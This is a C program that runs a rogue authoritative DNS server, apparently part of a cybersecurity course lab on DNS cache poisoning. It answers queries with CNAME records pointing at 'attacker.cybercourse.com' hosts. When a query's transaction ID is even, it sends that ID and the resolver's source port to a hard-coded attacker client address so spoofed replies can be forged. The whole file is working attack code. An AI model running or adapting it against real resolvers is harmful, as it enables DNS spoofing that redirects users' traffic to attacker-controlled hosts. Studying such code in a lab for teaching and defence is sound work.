#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ldns/ldns.h>

#define PORT 53
#define BUFFER_SIZE 4096
#define CLIENT_PORT 54321

typedef struct {
    int port_num;
    uint16_t txid_val;
} received_client_data;


ldns_pkt* create_dns_response(ldns_pkt *query_pkt, bool is_even_txid) {
    static int odd_counter = 1;  // Static counter for odd TXIDs

    ldns_pkt *response = ldns_pkt_new();
    if (!response) {
        return NULL;
    }

    ldns_pkt_set_id(response, ldns_pkt_id(query_pkt));
    ldns_pkt_set_qr(response, 1);
    ldns_pkt_set_aa(response, 1);

    // Set recursion options
    ldns_pkt_set_rd(response, ldns_pkt_rd(query_pkt));
    ldns_pkt_set_ra(response, 1);

    // Set RCODE to NOERROR
    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);

    // Extract the domain from the question
    ldns_rr *query_question = ldns_rr_list_rr(ldns_pkt_question(query_pkt), 0);
    ldns_rdf *query_name = ldns_rr_owner(query_question);
    char *domain = ldns_rdf2str(query_name);

    if (!domain) {
        ldns_pkt_free(response);
        return NULL;
    }

    // Create and add question to response
    ldns_rr *question = ldns_rr_new();
    ldns_rr_set_owner(question, ldns_rdf_clone(query_name));
    ldns_rr_set_type(question, ldns_rr_get_type(query_question));
    ldns_rr_set_class(question, ldns_rr_get_class(query_question));
    ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);

    // Create answer RR
    ldns_rr *answer = ldns_rr_new();
    ldns_rr_set_owner(answer, ldns_rdf_clone(query_name));
    ldns_rr_set_ttl(answer, 300);
    ldns_rr_set_class(answer, LDNS_RR_CLASS_IN);

    if (is_even_txid) {
        ldns_rr_set_type(answer, LDNS_RR_TYPE_CNAME);
        ldns_rdf *cname = ldns_dname_new_frm_str("www.example.cybercourse.com.");
        ldns_rr_push_rdf(answer, cname);
    } else {
        ldns_rr_set_type(answer, LDNS_RR_TYPE_CNAME);
        char cname_str[256];
        snprintf(cname_str, sizeof(cname_str), "ww%d.attacker.cybercourse.com.", odd_counter);
        ldns_rdf *cname = ldns_dname_new_frm_str(cname_str);
        ldns_rr_push_rdf(answer, cname);

        odd_counter++;
    }

    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer);

    free(domain);  // Free the allocated domain string
    return response;
}

int send_dns_response(int sockfd, ldns_pkt *response, struct sockaddr_in *client_addr, socklen_t addr_len) {
    uint8_t *wire_resp;
    size_t resp_len;
    ldns_status status = ldns_pkt2wire(&wire_resp, response, &resp_len);

    if (status != LDNS_STATUS_OK) {
        return -1;
    }
    char* response_m = malloc(LDNS_MAX_PACKETLEN);
    memcpy(response_m, wire_resp, resp_len);
    ssize_t sent = sendto(sockfd, response_m, resp_len, 0, (struct sockaddr *)client_addr, addr_len);

    if (sent == -1) {
        perror("sendto failed");
        free(wire_resp);
        return -1;
    }

    free(wire_resp);
    free(response_m);
    return 0;
}

int send_txid_and_port_to_client(uint16_t txid, uint16_t port) {
    int sock;
    struct sockaddr_in client_addr;
    received_client_data data;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return -1;
    }

    memset(&client_addr, 0, sizeof(client_addr));

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_addr.s_addr = inet_addr("192.168.1.202");  // Attacker's client IP

    // Fill the struct with the data
    data.port_num = port;
    data.txid_val = txid;

    if (sendto(sock, &data, sizeof(received_client_data), 0,
               (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        perror("sendto failed");
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}

int main() {
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    char buffer[BUFFER_SIZE] = {0};

    if ((server_fd = socket(AF_INET, SOCK_DGRAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    while(1) {
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);

        ssize_t recv_len = recvfrom(server_fd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);
        if (recv_len < 0) {
            perror("recvfrom failed");
            continue;
        }

        ldns_pkt *query_pkt;
        ldns_status status = ldns_wire2pkt(&query_pkt, (const uint8_t *)buffer, recv_len);
        if (status != LDNS_STATUS_OK) {
            continue;
        }

        ldns_rr_list *question = ldns_pkt_question(query_pkt);
        if (ldns_rr_list_rr_count(question) > 0) {
            ldns_rr *q = ldns_rr_list_rr(question, 0);
            ldns_rdf *qname = ldns_rr_owner(q);

            char *domain_str = ldns_rdf2str(qname);
            free(domain_str);

            uint16_t txid = ldns_pkt_id(query_pkt);
            uint16_t client_port = ntohs(client_addr.sin_port);

            bool is_even_txid = (txid % 2 == 0);
            ldns_pkt *response = create_dns_response(query_pkt, is_even_txid);

            if (response) {
                if (send_dns_response(server_fd, response, &client_addr, addr_len) == 0) {
                }
                ldns_pkt_free(response);
            }

            if (is_even_txid) {
                if (send_txid_and_port_to_client(txid, client_port) == 0) {
                    break;
                }
            }
        }
        ldns_pkt_free(query_pkt);
    }
    return 0;
}